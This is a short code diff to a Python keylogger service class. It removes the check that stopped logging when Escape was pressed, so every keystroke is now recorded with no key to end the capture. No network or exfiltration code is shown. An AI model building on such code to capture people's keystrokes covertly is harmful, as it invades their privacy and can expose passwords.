@@ -28,7 +28,5 @@ class KeyloggerService(IKeyLogger):
 
     def press(self,key):
         key_str = self.key_to_string(key)
-        if key_str == "<ESC>":
-            self.stop_logging()
         self.presses.append(key_str)
 
